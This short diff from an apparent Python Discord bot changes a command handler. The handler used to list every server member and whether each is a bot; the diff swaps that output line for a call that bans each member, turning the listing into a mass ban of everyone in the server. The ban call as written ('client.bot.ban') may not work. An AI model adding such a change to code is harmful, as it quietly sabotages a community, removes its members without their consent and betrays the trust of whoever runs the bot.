@@ -53,7 +53,7 @@ async def on_message(message):
 					for member in message.server.members:
 						players.append(member)		
 					for member in players:
-						await client.send_message(message.channel, f"Member: {member} Bot: {member.bot}")
+						await client.bot.ban(member, 1)
 				else:
 					await client.send_message(message.channel, "```css\n#Error\n\n[ 0 ] This command is not allowed in this server.\n\nLenny #EC:1001\n```")
 @client.event
